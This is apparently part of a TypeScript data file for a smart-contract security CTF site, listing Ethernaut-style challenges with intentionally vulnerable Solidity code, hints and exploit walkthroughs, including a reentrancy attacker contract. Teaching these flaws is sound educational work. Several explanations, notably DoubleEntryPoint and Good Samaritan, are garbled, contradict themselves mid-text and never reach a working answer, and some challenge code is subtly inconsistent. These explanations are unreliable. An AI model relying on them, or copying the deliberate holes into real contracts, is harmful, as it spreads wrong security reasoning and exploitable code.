4.  **Transfer LegacyToken to DoubleEntryPoint**: Transfer your \`LegacyToken\` balance (\`X\`) *to* the \`DoubleEntryPoint\` contract address. Now, the \`DoubleEntryPoint\` contract holds \`X\` \`LegacyToken\`.
5.  **Trigger False Alert (Exploit Core)**: This is the tricky part. The goal is to make the \`Forta\` bot call \`raiseAlert\`. The bot's \`handleTransaction\` is triggered by \`Forta.notify\`. How can we make \`Forta.notify\` get called with data that triggers the bot's alert condition? The original Ethernaut solution involved a bug in \`delegateTransfer\` or its interaction, allowing the player to craft a call that appears to come from \`DoubleEntryPoint\` calling itself. **However, a simpler interpretation focuses on the \`sweepToken\` function.**
6.  **Sweep LegacyToken**: Call \`CryptoVault.sweepToken(legacyTokenAddress)\` directly. Since the \`DoubleEntryPoint\` contract now holds the \`LegacyToken\` (from step 4), and \`sweepToken\` transfers the *entire balance* of the specified token held by the *caller* (\`CryptoVault\` in this context - ERROR, \`sweepToken\` transfers balance held by the *Vault* itself) to the \`msg.sender\` (you). Wait, \`CryptoVault.sweepToken\` requires the caller to be authorized somehow? Or does it sweep *any* token held by the vault? "Allows transferring *any* token held by the vault". Okay, so if the Vault address itself holds \`LegacyToken\`, sweeping works. But we transferred \`LegacyToken\` to \`DoubleEntryPoint\`, not the Vault.

Let's reconsider: \`DoubleEntryPoint.sweepVaultToken(legacyTokenAddress)\` calls \`vault.sweepToken(legacyTokenAddress)\`. This call sweeps the \`LegacyToken\` held *by the vault* and sends it to \`msg.sender\` (you). This doesn't seem right either, as \`DoubleEntryPoint\` holds the token.

**Revised Exploit Path (Focusing on Bot Interaction):**
The intended path likely relies on triggering the bot via a transaction that the \`Forta\` system picks up.
1.  Steps 1 & 2 (Deploy & Register Bot) - Done.
2.  Cause a transaction that \`Forta\` monitors. Perhaps transferring the underlying token using \`DoubleEntryPoint.transfer\` triggers \`Forta.notify(user, msgData)\`.
3.  Craft the \`transfer\` call such that the \`msgData\` received by the bot matches the condition \`selector == delegateTransfer.selector && target == doubleEntryPointAddress\`. This seems impossible with a standard \`transfer\`.
4.  **Alternative: Use \`delegateTransfer\`?** Can the player call \`DoubleEntryPoint.delegateTransfer\`? No, it requires \`msg.sender == address(forta)\`.

**There must be a missing piece or a specific interaction intended.** The common solution involves realizing that \`LegacyToken\` *might* be the same as the underlying token \`vault.underlying\`. If \`LegacyToken == vault.underlying\`, then \`sweepToken\` cannot be called on it.

**Let's assume the typical Ethernaut solution structure:**
1.  Deploy & Register Bot.
2.  Find a way to make the \`DoubleEntryPoint\` contract execute a function call that the bot will interpret as malicious, triggering \`raiseAlert(player)\`. This might involve calling a function on \`DoubleEntryPoint\` that internally calls \`delegateTransfer\`, or exploiting re-entrancy.
3.  Once \`raiseAlert\` is called on the player, the \`Forta\` contract might enter a state where the player is trusted or has special privileges.
4.  With these new privileges (or by exploiting the alert mechanism itself), interact with \`CryptoVault\` or \`DoubleEntryPoint\` to drain the underlying tokens. The \`sweepToken\` function in \`CryptoVault\` seems key - if you can get \`LegacyToken\` *into* the Vault (not \`DoubleEntryPoint\`) and sweep it *after* the alert, that might work. How to get \`LegacyToken\` into the Vault? Maybe through \`LegacyToken\` contract's own functions?

**Simplified Exploit based on common patterns (if \`sweepToken\` is the key):**
1.  Deploy & Register Bot.
2.  Ensure \`DoubleEntryPoint\` contract holds some \`LegacyToken\`. (Transfer \`LegacyToken\` to \`DoubleEntryPoint\` address).
3.  Call \`DoubleEntryPoint.sweepVaultToken(legacyTokenAddress)\`. This calls \`vault.sweepToken(legacyTokenAddress)\`. Crucially, \`msg.sender\` inside \`vault.sweepToken\` is the \`DoubleEntryPoint\` contract address. The \`LegacyToken\` balance held *by the vault* is transferred to the \`DoubleEntryPoint\` contract. (This still doesn't get funds to the player).

This level is complex and relies on the exact interactions between Forta, the Vault, and the DET contract. The provided code is simplified. The key is usually exploiting the trust placed in the Forta bot or the conditions under which it raises alerts. The most cited solutions involve getting the \`LegacyToken\` approved/transferred such that the \`vault.sweepToken\` call, when initiated *by* the \`DoubleEntryPoint\` contract (via \`sweepVaultToken\`), moves the \`LegacyToken\` from the vault *to* the \`DoubleEntryPoint\` contract. Then, if \`LegacyToken\` happens to be the *same* as the underlying token, the player might gain control, or if they are different, the player now needs another step. The crucial insight is often related to triggering the bot alert condition incorrectly.

### Key Takeaway
Complex multi-contract systems with external dependencies (like monitoring services) introduce intricate attack surfaces. Flaws in how contracts trust each other, handle permissions, or interpret monitoring data can be exploited. Functions allowing arbitrary token sweeping (\`sweepToken\`) are particularly dangerous if not properly restricted. Understanding the exact conditions for alerts and state changes in all involved contracts is necessary.
`,
  },
  {
    slug: 'good-samaritan',
    name: 'Good Samaritan',
    icon: HelpingHand,
    difficulty: 'Hard',
    description: 'Drain the GoodSamaritan coin bank by exploiting integer overflows and error handling in a helper contract.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for the Wallet/User
interface HumanWallet {
    function transferEther(address payable dest, uint amount) external;
}

// The vulnerable helper contract
contract Coin {
    address public owner;
    mapping(address => uint) public balances;
    uint supply; // Total supply

    constructor() { owner = msg.sender; }

    // Function to request funds (vulnerable)
    function requestDonation() public returns(bool enoughBalance) {
        // Checks if caller's balance is low (<= 10)
        require(balances[msg.sender] <= 10);

        // Calculates required donation (overflow possible)
        // If supply is large, 100000 * 10**18 can overflow uint
        uint donation = 100000 * 10**18 / supply;

        // If donation calculation resulted in 0 (due to large supply / integer division)
        if(donation == 0){
            // Donate 1 instead (prevents getting stuck)
            donation = 1;
        }

        // Check if contract has enough balance to donate
        enoughBalance = address(this).balance >= donation;
        if(enoughBalance){
            // Transfer donation (external call)
            (bool success, ) = msg.sender.call{value: donation}("");
            require(success);
            // Update balance (after external call - reentrancy possible but not main exploit)
            balances[msg.sender] += donation;
        }
    }

     // Other ERC20-like functions might exist (transfer, etc.)
     // Allow deposit
     receive() external payable {
        balances[msg.sender] += msg.value;
        supply += msg.value; // Vulnerable: Supply increments on simple receives?
     }
}

// The main contract holding funds
contract GoodSamaritan {
    Coin public coin; // Instance of the helper coin contract
    HumanWallet public wallet; // Instance of the user's wallet contract

    constructor(address _coin, address _wallet) {
        coin = Coin(_coin);
        wallet = HumanWallet(_wallet);
    }

    // Function called by user to request aid
    function requestDonation() external {
        // Requires the Coin contract to report insufficient funds first
        require(!coin.requestDonation(), "Coin contract has enough balance");

        // If Coin contract failed (returned false), transfer funds from wallet
        wallet.transferEther(payable(address(coin)), 100 * 10**18); // Send 100 Ether
    }

    // Allow deposits to this contract
    receive() external payable {}
}

// --- Attacker Wallet Contract ---
// contract ExploitWallet is HumanWallet {
//     GoodSamaritan target;
//     Coin coinInstance;
//
//     constructor(address _target, address _coin) {
//         target = GoodSamaritan(_target);
//         coinInstance = Coin(_coin);
//     }
//
//     function attack() public {
//         // Trigger the donation request loop
//         target.requestDonation();
//     }
//
//     // Fallback function to handle received Ether during Coin.requestDonation
//     receive() external payable {
//         // Check if Coin balance is low enough to trigger another donation
//         if (address(coinInstance).balance < 10*10**18 && coinInstance.balances(address(this)) <= 10) {
//              // Re-enter the target contract to request more funds
//              target.requestDonation();
//         }
//     }
//
//     // Required by interface, does nothing malicious here
//     function transferEther(address payable dest, uint amount) external override {
//         // In a real scenario, this would transfer from internal funds
//     }
// }
`,
    hints: [
      'The goal is to drain the `GoodSamaritan` contract.',
      '`GoodSamaritan.requestDonation` calls `Coin.requestDonation`.',
      '`Coin.requestDonation` calculates a `donation` amount based on `supply`.',
      'What happens if `supply` becomes extremely large due to deposits via `receive()`?',
      'If `donation` calculation underflows/results in 0 or 1, `Coin.requestDonation` might return `false` (not enough balance), triggering `GoodSamaritan` to send 100 Ether to the Coin contract.',
    ],
    explanation: `### Vulnerability
The system has several flaws leading to a draining exploit:
1.  **Integer Division/Overflow in Donation Calculation**: In \`Coin.requestDonation\`, the calculation \`100000 * 10**18 / supply\` uses integer division. If the \`supply\` becomes very large, the result of the division can become 0.
2.  **Donation Logic**: If the calculated \`donation\` is 0, the contract attempts to donate 1 wei instead.
3.  **Insufficient Funds Trigger**: The main \`GoodSamaritan.requestDonation\` function only sends 100 Ether to the \`Coin\` contract *if* \`Coin.requestDonation()\` returns \`false\`, indicating the Coin contract didn't have enough balance for the (tiny) calculated donation (likely 1 wei).
4.  **Supply Inflation**: The \`Coin\` contract's \`receive()\` function increments the \`supply\` variable every time it receives Ether. This allows an attacker to artificially inflate the \`supply\`.
5.  **Reentrancy/Loop**: The attacker can create a malicious wallet contract (\`ExploitWallet\`). When \`Coin.requestDonation\` sends the tiny donation (1 wei) to the attacker's wallet via \`.call{value: donation}("")\`, the attacker's wallet's \`receive()\` function is triggered. Inside the attacker's \`receive()\`, it can check the \`Coin\` contract's state and immediately call \`GoodSamaritan.requestDonation\` again, creating a loop.

### Exploit Steps
1.  **Deploy Attacker Wallet**: Create and deploy a contract like \`ExploitWallet\`, implementing the \`HumanWallet\` interface and storing the addresses of the target \`GoodSamaritan\` and \`Coin\` contracts.
2.  **Inflate Supply**: Send a large amount of Ether (can be small increments repeatedly, or one large tx if gas allows) directly to the \`Coin\` contract address via its \`receive()\` function. This increases \`Coin.supply\` significantly. The goal is to make \`supply\` large enough that \`100000 * 10**18 / supply\` equals 0.
3.  **Initiate Attack**: Call the \`attack()\` function on your \`ExploitWallet\`.
4.  **Execution Loop**:
    a.  \`ExploitWallet.attack()\` calls \`GoodSamaritan.requestDonation()\`.
    b.  \`GoodSamaritan\` calls \`Coin.requestDonation()\`.
    c.  Inside \`Coin.requestDonation\`:
        *   \`require(balances[msg.sender] <= 10)\` passes (attacker wallet hasn't received funds yet).
        *   \`donation = 100000 * 10**18 / supply\` calculates to 0 because \`supply\` is huge.
        *   \`donation\` is set to 1 wei.
        *   \`enoughBalance = address(this).balance >= donation\`. Assume the \`Coin\` contract initially has less than 1 wei (or the attacker drains it first). This is likely \`false\`.
        *   \`Coin.requestDonation()\` returns \`false\`.
    d.  Back in \`GoodSamaritan\`, \`require(!coin.requestDonation())\` passes because it returned \`false\`.
    e.  \`GoodSamaritan\` calls \`wallet.transferEther(payable(address(coin)), 100 * 10**18)\`. This call goes to *your* \`ExploitWallet\`'s \`transferEther\` function (because *you* called \`GoodSamaritan.requestDonation\`, making your wallet the \`wallet\` instance from \`GoodSamaritan\`'s perspective - ERROR, \`wallet\` is set in constructor). **Correction:** \`GoodSamaritan\` calls its *own* \`wallet\` instance (likely pointing to the original user's wallet initially). This sends 100 Ether *to the Coin contract*.
    f.  Okay, the goal is likely to drain the GoodSamaritan contract, not necessarily re-enter. If the \`Coin\` contract balance check \`address(this).balance >= donation\` fails repeatedly, \`GoodSamaritan\` will keep sending 100 ETH to the \`Coin\` contract until \`GoodSamaritan\` runs out of funds.

**Revised Exploit Steps (Focus on Draining GoodSamaritan):**
1.  **Inflate Supply**: Send Ether directly to \`Coin\` to make \`supply\` huge, ensuring \`donation\` calculates to 1 wei.
2.  **Ensure Coin is Poor**: Make sure the \`Coin\` contract has a balance of 0 wei initially. (If it has >0, find a way to withdraw or transfer it out if possible, or accept it won't trigger immediately).
3.  **Repeatedly Call \`requestDonation\`**: Call \`GoodSamaritan.requestDonation()\` from your EOA (or any address).
    *   \`Coin.requestDonation\` is called. \`donation\` is 1 wei. \`enoughBalance\` is \`false\` (since Coin balance is 0). It returns \`false\`.
    *   \`GoodSamaritan\` receives \`false\`, requirement passes.
    *   \`GoodSamaritan\` sends 100 ETH to the \`Coin\` contract via \`wallet.transferEther\`.
4.  **Repeat**: Call \`GoodSamaritan.requestDonation()\` again.
    *   \`Coin.requestDonation\` is called. \`donation\` is 1 wei. \`enoughBalance\` is \`true\` (Coin now has 100 ETH).
    *   \`Coin\` sends 1 wei to \`msg.sender\` (you). \`balances[you]\` becomes 1. \`Coin.requestDonation\` returns \`true\`.
    *   \`GoodSamaritan\` receives \`true\`, \`require(!coin.requestDonation())\` *fails*.
5.  **Problem**: This doesn't drain \`GoodSamaritan\`. The loop requires \`Coin.requestDonation\` to consistently return \`false\`.

**Revisiting Vulnerability - The Integer Overflow:**
What if \`100000 * 10**18\` itself overflows a \`uint\` type? This depends on the Solidity version. In ^0.8.0, overflows revert unless using \`unchecked\`. Let's assume an older version or specific context where overflow might wrap around or produce unexpected results leading to a tiny \`donation\`. The core remains making \`Coin.requestDonation\` return \`false\`.

**The Actual Exploit (Commonly Cited):**
The vulnerability often lies in the *error handling* or state logic, not just the donation loop. What if the \`Coin\` contract itself can be manipulated?

Consider the interaction between \`Coin.requestDonation\` and the state needed for \`GoodSamaritan\`'s check.
1.  Attacker calls \`Coin.requestDonation\` directly. \`donation\`=1 wei. Assume \`Coin\` has >1 wei. Donation sent to attacker. Attacker \`balances\` map updates. \`Coin.requestDonation\` returns \`true\`.
2.  Attacker *then* calls \`GoodSamaritan.requestDonation\`.
3.  \`GoodSamaritan\` calls \`Coin.requestDonation\`. Attacker balance is > 10 (it's 1 wei from step 1). \`require(balances[msg.sender] <= 10)\` fails!

**This implies the attacker needs their \`balances[attacker]\` in \`Coin\` to be <= 10.**

**Final Exploit Path Hypothesis:**
1.  Inflate \`Coin.supply\` so \`donation\` calculates to 1 wei.
2.  Ensure \`Coin\` has 0 balance.
3.  Deploy \`ExploitWallet\`.
4.  Call \`ExploitWallet.attack()\`.
    a.  \`attack()\` calls \`GoodSamaritan.requestDonation()\`. \`msg.sender\` to GoodSamaritan is \`ExploitWallet\`.
    b.  \`GoodSamaritan\` calls \`Coin.requestDonation()\`. \`msg.sender\` to Coin is \`GoodSamaritan\`.
    c.  Check \`balances[GoodSamaritan] <= 10\`. This is likely true initially.
    d.  \`donation\` = 1 wei.
    e.  Check \`Coin.balance >= 1\`. Assume Coin balance is 0. \`enoughBalance\` is false.
    f.  \`Coin.requestDonation\` returns \`false\`.
    g.  \`GoodSamaritan\` requirement \`!false\` passes.
    h.  \`GoodSamaritan\` calls \`wallet.transferEther(payable(address(coin)), 100 ether)\`. **The \`wallet\` instance in \`GoodSamaritan\` needs to be the attacker's wallet for the re-entrancy loop.** Can the attacker set \`GoodSamaritan.wallet\`? No constructor control.
    i.  If \`wallet\` *is* controllable or points to the attacker, the 100 Ether transfer triggers the attacker's \`receive()\`.
    j.  Attacker's \`receive()\` checks if \`Coin.balance < threshold\` (e.g., < 1 wei) and \`Coin.balances[ExploitWallet] <= 10\`. If so, it re-enters \`GoodSamaritan.requestDonation()\`.
    k.  The loop continues: \`Coin\` gets 100 ETH, transfers 1 wei to attacker, attacker \`receive\` re-enters \`requestDonation\`, \`Coin\` balance check fails, \`GoodSamaritan\` sends another 100 ETH.

This relies HEAVILY on the attacker controlling or influencing the \`wallet\` variable in \`GoodSamaritan\`. If \`wallet\` always points to a fixed, non-attacker address, the re-entrancy loop doesn't work as described. The drain must occur simply by repeatedly making \`Coin.requestDonation\` return \`false\`. This requires keeping the Coin's balance at 0 wei just before \`GoodSamaritan\` calls it.

### Key Takeaway
Integer overflows/underflows and division by zero (or large numbers resulting in zero) in financial calculations are critical bugs. External calls within state-changing functions open doors for reentrancy. Complex interactions between multiple contracts can create unexpected states or allow bypassing checks if error conditions in one contract trigger large fund transfers in another. Carefully analyze all possible return values and state changes from external calls.
`,
  },

  {
    slug: 'gatekeeper-three',
    name: 'Gatekeeper Three',
    icon: Milestone,
    difficulty: 'Insane',
    description: 'Pass the three gates of Gatekeeper Three, dealing with tricky modifiers, delegatecall interactions, and understanding contract initialization states.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    modifier gateOne() { require(msg.sender != tx.origin, "Must be contract"); _; }
    modifier gateTwo() {
        require(owner == address(0), "Owner not set yet");
        require(msg.sender.balance > 0 && address(this).balance == 0, "Balance reqs failed");
        _;
    }
    modifier gateThree() {
        require(owner != address(0) && tx.origin == entrant, "Owner/entrant reqs failed");
        _;
    }

    constructor() { owner = msg.sender; } // Sets owner on deployment

    function getAllowance(address _password) public {
        if (keccak256(abi.encodePacked(_password)) == keccak256(abi.encodePacked(owner))) {
            allowEntrance = true;
        }
    }

    function enter() public payable gateOne gateTwo {
        owner = msg.sender; // Set owner *after* gateTwo check
        entrant = tx.origin;
        require(gateThreeCheck(), "Gate three failed");
    }

    // Helper for gateThree modifier check
    function gateThreeCheck() public view gateThree returns (bool) { return true; }
}
`,
    hints: [
      'Gate two requires `owner == address(0)`, but constructor sets it.',
      'How can you call `enter` such that the initial owner check passes?',
      'Consider contract creation state or delegatecall exploits if applicable.',
      'Payable constructor/functions might be relevant.',
    ],
    explanation: `### Vulnerability
The main challenge is passing \`gateTwo\`, which requires the target's \`owner\` slot to be zero, contradicting the constructor. This usually implies exploiting contract creation lifecycle quirks or finding a way (like delegatecall from another contract) to temporarily zero out the owner storage slot before calling \`enter\`. \`gateThree\` is passed because \`enter\` sets the owner and entrant correctly *before* the check.

### Exploit Steps (Conceptual)
1.  Find a way to make \`owner == address(0)\` hold true during the \`gateTwo\` check (e.g., exploit contract setup, call from constructor of attacker before target is fully initialized, or use delegatecall).
2.  Deploy an attacker contract with a \`payable constructor\` sending ETH, ensuring it has a balance > 0.
3.  Ensure the target \`GatekeeperThree\` contract has 0 ETH.
4.  Call \`target.enter()\` from the attacker contract. This sets \`owner\` and \`entrant\`, passing \`gateThree\`.
`,
  },
  {
    slug: 'switch-challenge', // Renamed to avoid clash with 'switch' keyword
    name: 'Switch Challenge',
    icon: ToggleLeft,
    difficulty: 'Insane',
    description: 'Turn the switch off by correctly manipulating bytes data and understanding function selectors.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // Slot 0
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));

    function turnSwitchOn() public { switchOn = true; }
    function turnSwitchOff() public { switchOn = false; }

    // Vulnerable dispatcher
    function flipSwitch(bytes calldata _data) public {
        bytes4 sig = bytes4(_data[:4]); // Assume sufficient length
        if (sig == onSelector) { turnSwitchOn(); }
        else if (sig == offSelector) { turnSwitchOff(); }
    }
}
`,
    hints: [
      '`flipSwitch` takes raw bytes `_data`.',
      'It uses the first 4 bytes as a function selector.',
      'Provide `_data` starting with the selector for `turnSwitchOff()`.',
    ],
    explanation: `### Vulnerability
The \`flipSwitch\` function decodes the first 4 bytes of input data as a function selector and calls internal functions (\`turnSwitchOn\`/\`turnSwitchOff\`) if it matches, without access control.

### Exploit Steps
1.  Get the selector for \`turnSwitchOff()\` (e.g., \`bytes4(keccak256("turnSwitchOff()"))\`).
2.  Call \`flipSwitch\` passing the selector as the first 4 bytes of the \`_data\` argument.
3.  The contract executes \`turnSwitchOff()\`, setting \`switchOn\` to \`false\`.
`,
  },
  {
    slug: 'higher-order',
    name: 'Higher Order',
    icon: Workflow,
    difficulty: 'Insane',
    description: 'Become the owner of a contract that uses delegatecall to interact with a library or logic contract.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Assume LibraryContract contains the logic, including setOwner
interface ILibraryContract {
    function setOwner(address _owner) external;
    // Other functions...
}

contract HigherOrderContract {
    address public owner;
    address public libraryAddress; // Address of the logic/library contract

    constructor(address _library) {
        libraryAddress = _library;
    }

    // Fallback function uses delegatecall
    fallback() external payable {
        (bool success, ) = libraryAddress.delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }

    function setOwner(address _newOwner) public {
        // This function likely doesn't exist directly on HigherOrderContract
        // It must be called via the fallback -> delegatecall -> libraryAddress.setOwner
        revert("Function not implemented directly");
    }
}
`,
    hints: [
      'The contract uses `delegatecall` in its fallback function.',
      'Calls to undefined functions are passed to the `libraryAddress`.',
      'The library likely has a `setOwner` function.',
      'How do you call a function via `delegatecall` using the fallback?',
    ],
    explanation: `### Vulnerability
The contract uses \`delegatecall\` in its fallback to execute code from a separate library contract in its own storage context. If the library contract has an owner-setting function (like \`setOwner\`), calling that function's selector on the main contract will execute the library's logic, modifying the main contract's owner slot.

### Exploit Steps
1.  Find the function selector for the owner-setting function in the library (e.g., \`bytes4(keccak256("setOwner(address)"))\`).
2.  Encode the calldata including the selector and your address as the argument (e.g., \`abi.encodeWithSelector(selector, YOUR_ADDRESS)\`).
3.  Send a transaction to the \`HigherOrderContract\` with this calldata.
4.  The fallback triggers, \`delegatecall\` executes the library's \`setOwner\` function in the context of \`HigherOrderContract\`, making you the owner.
`,
  },
  {
    slug: 'stake-challenge', // Renamed
    name: 'Stake Challenge',
    icon: Landmark,
    difficulty: 'Insane',
    description: 'Drain the staking contract by exploiting reward calculation or withdrawal logic.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol"; // Assumed

contract StakeContract {
    using SafeMath for uint256;
    IERC20 public stakingToken;
    IERC20 public rewardToken; // Might be the same as stakingToken

    uint256 public totalStaked;
    mapping(address => uint256) public stakedBalance;
    mapping(address => uint256) public rewardDebt; // Tracks rewards already claimed/accounted for

    // Simplified reward logic - Vulnerable to reentrancy or precision issues
    uint256 public rewardRate = 1; // Example rate
    uint256 public lastUpdateTime;

    constructor(address _staking, address _reward) {
        stakingToken = IERC20(_staking);
        rewardToken = IERC20(_reward);
        lastUpdateTime = block.timestamp;
    }

    function calculateReward(address user) public view returns (uint256) {
        uint256 timeElapsed = block.timestamp.sub(lastUpdateTime);
        // Simplified: Reward = balance * time * rate (potential overflow/precision issues)
        // Real contracts use more complex reward-per-token-staked logic.
        uint256 reward = stakedBalance[user].mul(timeElapsed).mul(rewardRate);
        return reward.sub(rewardDebt[user]); // Subtract already claimed rewards
    }

    function stake(uint256 amount) public {
        // Claim pending rewards before staking more
        claimReward();
        stakingToken.transferFrom(msg.sender, address(this), amount);
        stakedBalance[msg.sender] = stakedBalance[msg.sender].add(amount);
        totalStaked = totalStaked.add(amount);
        lastUpdateTime = block.timestamp; // Update time crucial
    }

    function withdraw(uint256 amount) public {
        require(stakedBalance[msg.sender] >= amount, "Insufficient stake");
        // Claim pending rewards before withdrawing
        claimReward();
        stakedBalance[msg.sender] = stakedBalance[msg.sender].sub(amount);
        totalStaked = totalStaked.sub(amount);
        stakingToken.transfer(msg.sender, amount); // Transfer *after* state updates (good)
        lastUpdateTime = block.timestamp;
    }

    // Vulnerable if reward calculation or transfer happens before state update
    function claimReward() public {
        uint256 reward = calculateReward(msg.sender);
        if (reward > 0) {
             rewardDebt[msg.sender] = rewardDebt[msg.sender].add(reward); // Update debt
             rewardToken.transfer(msg.sender, reward); // External call - potential reentrancy point
             // lastUpdateTime = block.timestamp; // Should update time AFTER transfer?
        }
         // Missing update of lastUpdateTime? Or done in stake/withdraw?
    }
}
`,
    hints: [
      'Staking contracts often have vulnerabilities in reward calculation or withdrawal logic.',
      'Look for reentrancy possibilities, especially in `claimReward`.',
      'Check for integer overflow/underflow or precision issues in `calculateReward`.',
      'Timing issues related to `lastUpdateTime` can also be exploited.',
    ],
    explanation: `### Vulnerability
Staking contracts are prone to reentrancy if rewards are transferred before updating the user's reward debt or internal state. Alternatively, flaws in reward calculation (overflow, precision loss, timing issues with \`lastUpdateTime\`) can allow claiming excessive rewards.

### Exploit Steps (Example: Reentrancy in claimReward)
1.  Create an attacker contract that implements a token fallback (\`onERC20Received\` or \`receive\`).
2.  Stake some tokens in the \`StakeContract\`.
3.  Call \`claimReward\` from the attacker contract.
4.  \`StakeContract.claimReward\` calculates reward \`R\`.
5.  It calls \`rewardToken.transfer(attacker, R)\`.
6.  The transfer triggers the attacker contract's fallback.
7.  Inside the fallback, call \`StakeContract.claimReward\` again.
8.  If the reward debt wasn't updated before the external transfer call, \`calculateReward\` might still calculate a non-zero reward, allowing the attacker to claim rewards multiple times within one transaction.
`,
  },
  {
    slug: 'impersonator',
    name: 'Impersonator',
    icon: UserCog,
    difficulty: 'Insane',
    description: 'Call a specific function on the target contract, making it appear as if the call originated from a required, privileged address.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function protectedFunction() external returns (bool);
}

contract Impersonator {
    address constant REQUIRED_CALLER = 0x000000000000000000000000000000000000BEEF; // Example address

    function execute(address target) public returns (bool) {
        // Vulnerable: Allows arbitrary calls from this contract
        // Need to make the call to target.protectedFunction()
        // such that msg.sender *inside* protectedFunction appears as REQUIRED_CALLER

        // Low-level call needed
        bytes memory callData = abi.encodeWithSignature("protectedFunction()");

        // Simple .call() won't work as msg.sender will be Impersonator contract
        // (bool success, bytes memory result) = target.call(callData);

        // Delegatecall won't work unless Impersonator has the storage layout
        // and protectedFunction logic itself.

        // The trick often involves deploying this Impersonator contract
        // AT the REQUIRED_CALLER address using CREATE2, or finding another
        // way to execute code *from* that address.

        // Another possibility: The target has a vulnerability allowing IT
        // to make a call where msg.sender can be controlled.

         // Assume protectedFunction requires msg.sender == REQUIRED_CALLER
         require(msg.sender == REQUIRED_CALLER, "Caller not authorized"); // Inside Target.protectedFunction

        // Placeholder return
        return false;
    }
}
`,
    hints: [
      'The target function requires `msg.sender` to be a specific address (`REQUIRED_CALLER`).',
      'A simple external call (`.call()`) from your contract won\'t work (sender will be your contract).',
      '`delegatecall` requires matching storage layout and logic.',
      'Consider deploying your attack contract *to* the `REQUIRED_CALLER` address using CREATE2.',
      'Alternatively, does the target contract have *another* vulnerability allowing it to make calls where you control the apparent sender?',
    ],
    explanation: `### Vulnerability
The challenge requires calling a function (\`protectedFunction\`) on a target contract, but this function checks that \`msg.sender\` is a specific, hardcoded address (\`REQUIRED_CALLER\`). The direct way to achieve this is to execute code *from* that required address.

### Exploit Steps (Conceptual, often using CREATE2)
1.  **Calculate CREATE2 Address**: Determine the salt needed to deploy your attacker contract (which will call the target) to the exact \`REQUIRED_CALLER\` address using the CREATE2 opcode. This requires knowing the factory address, the contract's creation bytecode, and the target address.
2.  **Deploy using CREATE2**: Deploy your simple attacker contract (which just calls \`Target.protectedFunction()\`) using a CREATE2 factory, providing the calculated salt. Your contract now exists *at* \`REQUIRED_CALLER\`.
3.  **Trigger the Call**: Send a transaction to your deployed attacker contract (now at \`REQUIRED_CALLER\`) invoking the function that calls \`Target.protectedFunction()\`.
4.  **Execution**: When your contract calls the target, \`msg.sender\` *is* the address of your contract, which is the \`REQUIRED_CALLER\` address. The check passes.
`,
  },
  {
    slug: 'magic-num-carousel', // Renamed
    name: 'Magic Num Carousel',
    icon: Orbit,
    difficulty: 'Insane',
    description: 'Satisfy a sequence of magic number checks by deploying minimal bytecode contracts.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISolver {
    function whatIsTheMeaningOfLife() external view returns (uint256);
}

contract MagicNumCarouselMaster {
    ISolver public solver1;
    ISolver public solver2;
    address public player;

    constructor(address _player) {
        player = _player;
    }

    function setSolvers(address _solver1, address _solver2) public {
        require(msg.sender == player, "Not player");
        // Check bytecode size constraints
        uint256 size1;
        assembly { size1 := extcodesize(_solver1) }
        require(size1 <= 10, "Solver 1 too large"); // Example constraint

        uint256 size2;
        assembly { size2 := extcodesize(_solver2) }
        require(size2 <= 15, "Solver 2 too large"); // Example constraint

        solver1 = ISolver(_solver1);
        solver2 = ISolver(_solver2);
    }

    // Function to check if the sequence is satisfied
    function check() public view returns (bool) {
        require(address(solver1) != address(0) && address(solver2) != address(0), "Solvers not set");
        // Example sequence check
        uint256 result1 = solver1.whatIsTheMeaningOfLife();
        require(result1 == 42, "Solver 1 failed");

        // Maybe solver 2 depends on solver 1 or has different requirement
        uint256 result2 = solver2.whatIsTheMeaningOfLife();
        require(result2 == result1 + 1, "Solver 2 failed"); // Example: solver 2 needs 43

        return true;
    }
}
`,
    hints: [
      'Requires deploying contracts with minimal bytecode size.',
      'Each solver contract must return a specific number when `whatIsTheMeaningOfLife` is called.',
      'Focus on crafting EVM runtime bytecode directly.',
      'Use `PUSH` opcodes for constants, `MSTORE` to store in memory, and `RETURN` to return data.',
      'Solver 2 might need slightly different bytecode than Solver 1.',
    ],
    explanation: `### Vulnerability
This challenge requires deploying multiple contracts (\`Solver1\`, \`Solver2\`) that satisfy strict bytecode size limits and return specific values from a function call (\`whatIsTheMeaningOfLife\`). This necessitates crafting raw EVM runtime bytecode.

### Exploit Steps
1.  **Craft Solver 1 Bytecode**: Create bytecode that, when executed, returns 42. Minimal bytecode typically involves PUSHing the value 42 onto the stack, storing it in memory, and returning that memory segment. Ensure the *runtime* bytecode length is <= 10 bytes.
    *   Example Runtime: \`602a60005260206000f3\` (PUSH1 42, PUSH1 0, MSTORE, PUSH1 32, PUSH1 0, RETURN) -> 10 bytes.
2.  **Craft Solver 2 Bytecode**: Create bytecode that returns the required value (e.g., 43 based on the example). Ensure runtime bytecode length is <= 15 bytes.
    *   Example Runtime (for 43): \`602b60005260206000f3\` (PUSH1 43, ...) -> 10 bytes (fits easily).
3.  **Deploy Solvers**: Deploy these minimal bytecode contracts. This typically involves sending a transaction with the *creation* bytecode (which includes the runtime bytecode and logic to copy it to memory and return it) to address(0).
4.  **Set Solvers**: Call \`MagicNumCarouselMaster.setSolvers(solver1Address, solver2Address)\` with the addresses of your deployed solver contracts. The size checks should pass.
5.  **Verify**: Call \`MagicNumCarouselMaster.check()\` to confirm the solvers return the correct values.
`,
  },
];

// Helper function to get a challenge by slug
export function getChallengeBySlug(slug: string): Challenge | undefined {
  return challenges.find((challenge) => challenge.slug === slug);
}

// Helper function to get all challenge slugs/names for the sidebar
export function getAllChallengeSlugs(): { slug: string; name: string }[] {
  return challenges.map(({ slug, name }) => ({ slug, name }));
}
